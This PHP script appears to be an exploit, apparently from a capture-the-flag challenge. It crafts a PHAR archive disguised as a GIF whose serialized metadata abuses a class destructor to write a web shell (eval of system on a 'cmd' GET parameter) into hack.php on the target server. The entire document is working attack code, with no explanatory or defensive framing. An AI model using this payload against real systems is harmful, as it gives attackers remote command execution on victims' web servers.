<?php 
class Meme
{
    public $title;
    public $author;
    public $filename;
    private $content = NULL;
    function __construct($title, $author, $content = NULL)
    {
        $this->title = $title;
        $this->author = $author;
        $this->content = $content;
        $this->filename = "images/$author/$title.gif";
    }
    function __destruct()
    {
        if ($this->content != NULL)
            file_put_contents($this->filename, $this->content);
    }
}

$title = "hack";
$author = "lifeishard";
$content = "<?php eval(system(\$_GET['cmd']));?>";
$meme = new Meme($title, $author, $content);
$meme->filename = "images/lifeishard/hack.php";
$phar = new Phar("hack.phar");
$phar->startBuffering();
$phar->setStub("GIF89a<?php  __HALT_COMPILER(); ?>");
$phar->setMetadata($meme);
$phar->addFromString("test.txt", "testtest");
$phar->stopBuffering();
?>
